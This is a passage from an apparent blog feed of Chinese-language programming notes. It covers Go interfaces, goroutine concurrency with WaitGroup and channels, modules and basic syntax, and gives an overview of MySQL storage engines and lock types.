srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530190954843"></p><ul><li>实现方法与实现函数的区别在于，<code>func</code> 和函数名<code>hello</code> 之间，加上该方法对应的实例名 <code>stu</code> 及其类型 <code>*Student</code>，可以通过实例名访问该实例的字段<code>name</code>和其他方法了。</li><li>调用方法通过 <code>实例名.方法名(参数)</code> 的方式。</li><li>可以直接使用new进行实例</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//接口</span></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">interface</span> &#123;</span><br><span class="line">getName() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="keyword">string</span> </span><br><span class="line">age <span class="keyword">int</span></span><br><span class="line">sex <span class="keyword">byte</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stu *Student)</span> <span class="title">getName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> stu.name</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span>  <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//检测接口是否已经全部被重写</span></span><br><span class="line">    <span class="keyword">var</span> _ Person = (*Student)(<span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">var</span> _ Person = (*Worker)(<span class="literal">nil</span>)<span class="comment">//将空值 nil 转换为 *Work 类型，再转换为 Person 接口，如果转换失败，说明接口还没全部重写</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将Student实例类型转为Person</span></span><br><span class="line">    <span class="keyword">var</span> p Person = &amp;Student&#123;</span><br><span class="line">name: <span class="string">&quot;caixukun&quot;</span>,</span><br><span class="line">age:  <span class="number">18</span>,</span><br><span class="line">sex:<span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(p.getName()) <span class="comment">// caixukun</span></span><br><span class="line">fmt.Println(reflect.TypeOf(p))</span><br><span class="line"><span class="comment">//fmt.Println(p.name) //报错  p.name undefined (type Person has no field or method name)</span></span><br><span class="line">   </span><br><span class="line">    <span class="comment">//接口强制类型转位实例</span></span><br><span class="line">    stu:=p.(*Student)</span><br><span class="line"><span class="built_in">print</span>(stu.name)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//空接口</span></span><br><span class="line"><span class="comment">//如果定义了一个没有任何方法的空接口，那么这个接口可以表示任意类型。例如</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">m[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;Tom&quot;</span></span><br><span class="line">m[<span class="string">&quot;age&quot;</span>] = <span class="number">18</span></span><br><span class="line">m[<span class="string">&quot;scores&quot;</span>] = [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">98</span>, <span class="number">99</span>, <span class="number">85</span>&#125;</span><br><span class="line">fmt.Println(m) <span class="comment">// map[age:18 name:Tom scores:[98 99 85]]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="并发编程"><a href="#并发编程" class="headerlink" title="并发编程"></a>并发编程</h1><p>Go 语言提供了 sync 和 channel 两种方式支持协程(goroutine)的并发。</p><p>例如我们希望并发下载 N 个资源，多个并发协程之间不需要通信，那么就可以使用 sync.WaitGroup，等待所有并发协程执行结束。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过使用sync.WaitGroup进行并发</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">download</span><span class="params">(url <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;start to download&quot;</span>, url)</span><br><span class="line">time.Sleep(time.Second) <span class="comment">// 模拟耗时操作</span></span><br><span class="line">wg.Done() <span class="comment">//完成任务减去一个计数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>) <span class="comment">//为wg添加一个计数 加入一个线程</span></span><br><span class="line"><span class="keyword">go</span> download(<span class="string">&quot;a.com/&quot;</span> + <span class="keyword">string</span>(i+<span class="string">&#x27;0&#x27;</span>)) <span class="comment">//启动新的线程并发执行该函数</span></span><br><span class="line">&#125;</span><br><span class="line">wg.Wait() <span class="comment">//等待所有线程结束</span></span><br><span class="line">fmt.Println(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用channel进行</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> ch = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="number">10</span>) <span class="comment">// 创建大小为 10 的缓冲信道</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">download</span><span class="params">(url <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;start to download&quot;</span>, url)</span><br><span class="line">time.Sleep(time.Second) <span class="comment">// 模拟耗时操作</span></span><br><span class="line">ch &lt;- url <span class="comment">// 将 url 发送给信道</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> download(<span class="string">&quot;a.com/&quot;</span> + <span class="keyword">string</span>(i+<span class="string">&#x27;0&#x27;</span>)) <span class="comment">//启动新的线程并发执行该函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">msg := &lt;-ch <span class="comment">// 等待信道返回消息。</span></span><br><span class="line">fmt.Println(<span class="string">&quot;finish&quot;</span>, msg)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="包和模块"><a href="#包和模块" class="headerlink" title="包和模块"></a>包和模块</h1><p>go 1.16版本之前，go build, go test以及其他包构建命令 自动查找并下载依赖包并将依赖添加到go.mod中，go 1.16及其以后，go command不再自动下载不在go.mod中的依赖，而是需要通过go get 命令手动下载</p><p><code>go init example</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//calc.go</span></span><br><span class="line"><span class="keyword">package</span> calc</span><br><span class="line"><span class="comment">//导入函数的声明必须大写开头</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span><span class="params">(num1 <span class="keyword">int</span>, num2 <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;rsc.io/quote&quot;</span></span><br><span class="line"><span class="string">&quot;example/calc&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(quote.Hello()) </span><br><span class="line">fmt.Println(calc.Add(<span class="number">10</span>,<span class="number">3</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于版本是go1.16 已经不支持自动下载包，手动下载命令</p><p><code>go get rsc.io/quote</code></p><p>文件结构：<img src="/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20210530211120803.png" class="lazyload" data-srcset="/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20210530211120803.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530211120803" style="zoom:67%;"></p><p>运行结果：<img src="/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20210530211520439.png" class="lazyload" data-srcset="/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20210530211520439.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530211520439" style="zoom: 67%;"></p>]]></content>
      
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> 语言基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-并发控制</title>
      <link href="/2021/05/18/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6/"/>
      <url>/2021/05/18/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql存储引擎"><a href="#Mysql存储引擎" class="headerlink" title="Mysql存储引擎"></a>Mysql存储引擎</h1><p><code>MySQL</code>最常用引擎：<code>MyISAM</code>和<code>InnoDB</code>，在<code>MySQL 5.5.5</code>以前，默认的存储引擎为<code>MyISAM</code>，之后版本默认为<code>InnoDB</code>。<code>InnoDB</code>对事物完整性更好以及有更高的并发性，下面了解一下他们之间的区别：</p><table><thead><tr><th>对比项</th><th>MyISAM</th><th>InnoDB</th></tr></thead><tbody><tr><td>主外键</td><td>不支持</td><td>支持</td></tr><tr><td>事务</td><td>不支持</td><td>支持</td></tr><tr><td>行表锁</td><td>锁。操作一条记录也会锁住整个表</td><td>行锁。操作时只锁某一行</td></tr><tr><td>缓存</td><td>只缓存索引，不缓存真实数据</td><td>不仅缓存索引，还缓存真实数据</td></tr><tr><td>表空间</td><td>小</td><td>大</td></tr><tr><td>关注点</td><td>性能</td><td>事务</td></tr><tr><td>默认安装</td><td>是</td><td>是</td></tr></tbody></table><h1 id="锁机制"><a href="#锁机制" class="headerlink" title="锁机制"></a>锁机制</h1><p>锁的主要作用是管理共享资源的并发访问，锁可以用于实现事务的隔离。</p><h2 id="锁的分类"><a href="#锁的分类" class="headerlink" title="锁的分类"></a>锁的分类</h2><h6 id="1-操作类型区分（读-写）分类："><a href="#1-操作类型区分（读-写）分类：" class="headerlink" title="1.操作类型区分（读/写）分类："></a>1.操作类型区分（读/写）分类：</h6><ul><li>共享锁（读锁）</li><li>排它锁（写锁）</li></ul><h6 id="2-对数据操作的粒度区分："><a href="#2-对数据操作的粒度区分：" class="headerlink" title="2.对数据操作的粒度区分："></a>2.对数据操作的粒度区分：</h6><ul><li>表锁</li><li>行锁</li></ul><img src="/2021/05/18/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6/image-20210518124829194.png" class="lazyload" data-srcset="/2021/05/18/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6/image-20210518124829194.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210518124829194" style="zoom:67%;">]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GO语言开发配置</title>
      <link href="/2021/04/29/GO/GO%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E9%85%8D%E7%BD%AE/"/>
      <url>/2021/04/29/GO/GO%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><h2 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h2><p><code>:=</code>语法是声明和初始化变量的简写形式</p><p><code>var f string =“short”</code></p><p> <code>f := &quot;short&quot;</code></p><h2 id="循环体"><a href="#循环体" class="headerlink" title="循环体"></a>循环体</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// `for` is Go&#x27;s only looping construct. Here are</span></span><br><span class="line"><span class="comment">// three basic types of `for` loops.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The most basic type, with a single condition.</span></span><br><span class="line">    i := <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i &lt;= <span class="number">3</span> &#123;</span><br><span class="line">        fmt.Println(i)</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A classic initial/condition/after `for` loop.</span></span><br><span class="line">    <span class="keyword">for</span> j := <span class="number">7</span>; j &lt;= <span class="number">9</span>; j++ &#123;</span><br><span class="line">        fmt.Println(j)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// `for` without a condition will loop repeatedly</span></span><br><span class="line">    <span class="comment">// until you `break` out of the loop or `return` from</span></span><br><span class="line">    <span class="comment">// the enclosing function.</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;loop&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// You can also `continue` to the next iteration of</span></span><br><span class="line">    <span class="comment">// the loop.</span></span><br><span class="line">    <span class="keyword">for</span> n := <span class="number">0</span>; n &lt;= <span class="number">5</span>; n++ &#123;</span><br><span class="line">        <span class="keyword">if</span> n%<span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(n)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h2><h3 id="slice-low-high-左闭右开区间"><a href="#slice-low-high-左闭右开区间" class="headerlink" title="slice[low,high]左闭右开区间"></a>slice[low,high]左闭右开区间</h3><h2 id="迭代数组或者切片"><a href="#迭代数组或者切片" class="headerlink" title="迭代数组或者切片"></a>迭代数组或者切片</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//for 索引,值 :=range(切片/数组)</span></span><br><span class="line">slice_nums:=<span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">5</span>)</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="built_in">len</span>(slice_nums);i++&#123;</span><br><span class="line">    slice_nums[i]=i+<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;打印切片&quot;</span>,slice_nums)</span><br><span class="line"><span class="comment">//迭代切片</span></span><br><span class="line"><span class="keyword">for</span> i,value:=<span class="keyword">range</span> slice_nums&#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;索引&quot;</span>,i,<span class="string">&quot;值&quot;</span>,value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">arr_nums:=[]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="comment">// for i:=0;i&lt;len(arr_nums);i++&#123;</span></span><br><span class="line"><span class="comment">// arr_nums[i]=i;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">fmt.Println(<span class="string">&quot;打印数组&quot;</span>,arr_nums)</span><br><span class="line"><span class="keyword">for</span> i,value:=<span class="keyword">range</span> arr_nums&#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;索引&quot;</span>,i,<span class="string">&quot;值&quot;</span>,value)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><img src="/2021/04/29/GO/GO%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E9%85%8D%E7%BD%AE/image-20210429170007047.png" class="lazyload" data-srcset="/2021/04/29/GO/GO%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E9%85%8D%E7%BD%AE/image-20210429170007047.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210429170007047" style="zoom:50%;"><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">函数原型</span><br><span class="line">func 函数名(参数名 参数类型，参数名 参数类型，···)返回值类型&#123;</span><br><span class="line">···</span><br><span class="line">&#125;</span><br><span class="line">多返回值类型</span><br><span class="line">func 函数名(参数名 参数类型，参数名 参数类型，···)(返回值类型,返回值类型,···)&#123;</span><br><span class="line">···</span><br><span class="line">&#125;</span><br><span class="line">可变参数类型</span><br><span class="line">func 函数名(slice/array数组名 ...参数类型)&#123;</span><br><span class="line">for 索引,值 := range slice/array数组名&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(a,b)</span><span class="title">int</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//可变参数类型例子 传入一数组名称 ...</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(a...<span class="keyword">int</span>)</span><span class="title">int</span></span>&#123;</span><br><span class="line">fmt.Println(a)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">add(a...)</span><br></pre></td></tr></table></figure><h2 id="匿名函数定义"><a href="#匿名函数定义" class="headerlink" title="匿名函数定义"></a>匿名函数定义</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">函数原型</span><br><span class="line"><span class="function"><span class="keyword">func</span> 外层函数名 <span class="title">func</span><span class="params">()</span> 匿名函数返回值</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span> 返回值</span>&#123;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">intSeq</span><span class="params">()</span> <span class="title">func</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="comment">//返回值 返回一个函数该函数的返回值为整型</span></span><br><span class="line">    a:=<span class="number">0</span></span><br><span class="line">fmt.Println(<span class="string">&quot;初始化···&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">a+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a:=intSeq()</span><br><span class="line">fmt.Println(a())</span><br><span class="line">fmt.Println(a())</span><br><span class="line">fmt.Println(a())</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行截图<img src="/2021/04/29/GO/GO%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E9%85%8D%E7%BD%AE/image-20210502214714530.png" class="lazyload" data-srcset="/2021/04/29/GO/GO%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E9%85%8D%E7%BD%AE/image-20210502214714530.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210502214714530"></p><p>匿名函数将地址赋值给intSeq( )，然后每调用一次，调用地址对应的匿名函数</p><h2 id="函数递归"><a href="#函数递归" class="headerlink" title="函数递归"></a>函数递归</h2>]]></content>
      
      
      <categories>
          
          <category> 语言基础 </category>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidity语言基础</title>
      <link href="/2021/04/10/%E5%8C%BA%E5%9D%97%E9%93%BE/Solidity%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/04/10/%E5%8C%BA%E5%9D%97%E9%93%BE/Solidity%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</url>
      
